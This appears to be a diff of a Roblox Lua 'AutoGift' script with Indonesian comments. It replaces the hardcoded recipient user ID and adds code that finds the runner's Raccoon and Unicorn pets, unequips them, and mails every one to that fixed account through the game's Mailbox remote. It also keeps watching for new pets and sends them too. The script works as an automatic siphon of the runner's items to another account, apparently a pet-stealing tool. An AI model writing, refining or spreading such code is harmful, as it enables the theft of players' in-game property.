@@ -12,13 +12,12 @@ local Networking = require(ReplicatedStorage.SharedModules.Networking)
 -- CONFIG
 --------------------------------------------------
 
-local TARGET_USER_ID = 8139051826 -- GANTI USER ID TUJUAN
+local TARGET_USER_ID = 8715392471 -- GANTI USERID TUJUAN
 local NOTE = "Gift"
 
 local TARGET_PETS = {
     ["Raccoon"] = true,
     ["Unicorn"] = true,
-
 }
 
 --------------------------------------------------
@@ -28,11 +27,53 @@ local TARGET_PETS = {
 local SentPetIds = {}
 
 --------------------------------------------------
--- SEND PET
+-- WAIT BACKPACK LOAD
+--------------------------------------------------
+
+local function WaitBackpackLoaded()
+    print("[AutoGift] Waiting Backpack...")
+
+    repeat
+        task.wait(0.5)
+    until #Backpack:GetChildren() > 0
+
+    print("[AutoGift] Backpack Loaded!")
+end
+
+--------------------------------------------------
+-- UNEQUIP
+--------------------------------------------------
+
+local function UnequipTargetPets()
+
+    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
+
+    if Humanoid then
+        Humanoid:UnequipTools()
+    end
+
+    task.wait(0.5)
+
+    for _, tool in ipairs(Character:GetChildren()) do
+        if tool:IsA("Tool") and TARGET_PETS[tool.Name] then
+            tool.Parent = Backpack
+        end
+    end
+end
+
+--------------------------------------------------
+-- SEND
 --------------------------------------------------
 
 local function SendPet(tool)
-    if not tool or not tool:IsA("Tool") then
+
+    if not tool then
+        return
+    end
+
+    if not tool:IsA("Tool") then
         return
     end
 
@@ -43,7 +84,7 @@ local function SendPet(tool)
     local petId = tool:GetAttribute("PetId")
 
     if not petId then
-        warn("PetId tidak ditemukan:", tool.Name)
+        warn("PetId Missing :", tool.Name)
         return
     end
 
@@ -53,11 +94,14 @@ local function SendPet(tool)
 
     SentPetIds[petId] = true
 
-    print("Sending:", tool.Name, petId)
+    print("Sending :", tool.Name, petId)
 
     local success, result = pcall(function()
+
         return Networking.Mailbox.SendBatch:Fire(
+
             TARGET_USER_ID,
+
             {
                 {
                     Category = "Pets",
@@ -65,78 +109,74 @@ local function SendPet(tool)
                     Count = 1
                 }
             },
+
             NOTE
+
         )
+
     end)
 
-    print("Result:", success, result)
+    print(success, result)
 
     if not success then
         SentPetIds[petId] = nil
     end
+
 end
 
 --------------------------------------------------
--- UNEQUIP TARGET PETS
+-- SCAN
 --------------------------------------------------
 
-local function UnequipTargetPets()
-    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
-
-    if Humanoid then
-        Humanoid:UnequipTools()
-    end
-
-    task.wait(0.3)
-
-    -- Pastikan benar-benar pindah ke Backpack
-    for _, tool in ipairs(Character:GetChildren()) do
-        if tool:IsA("Tool") and TARGET_PETS[tool.Name] then
-            tool.Parent = Backpack
-        end
-    end
-end
-
---------------------------------------------------
--- SCAN BACKPACK
---------------------------------------------------
-
-local function ScanBackpack()
+local function Scan()
 
     UnequipTargetPets()
 
-    task.wait(0.2)
+    task.wait(0.5)
 
     for _, tool in ipairs(Backpack:GetChildren()) do
         SendPet(tool)
     end
+
 end
 
 --------------------------------------------------
 -- START
 --------------------------------------------------
 
--- Scan pet yang sudah ada
-ScanBackpack()
+task.spawn(function()
 
--- Jika Character respawn
-LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(1)
-    ScanBackpack()
+    -- Tunggu Backpack benar-benar ada isinya
+    WaitBackpackLoaded()
+
+    -- Scan pertama
+    Scan()
+
+    -- Monitor pet baru
+    Backpack.ChildAdded:Connect(function(tool)
+
+        task.wait(0.5)
+
+        UnequipTargetPets()
+
+        task.wait(0.3)
+
+        SendPet(tool)
+
+    end)
+
 end)
 
--- Jika ada pet baru masuk Backpack
-Backpack.ChildAdded:Connect(function(tool)
+--------------------------------------------------
+-- RESPAWN
+--------------------------------------------------
 
-    task.wait(0.5)
+LocalPlayer.CharacterAdded:Connect(function()
 
-    -- Kalau ternyata sedang di Character, unequip lagi
-    UnequipTargetPets()
+    task.wait(2)
 
-    task.wait(0.2)
+    WaitBackpackLoaded()
 
-    SendPet(tool)
+    Scan()
 
 end)
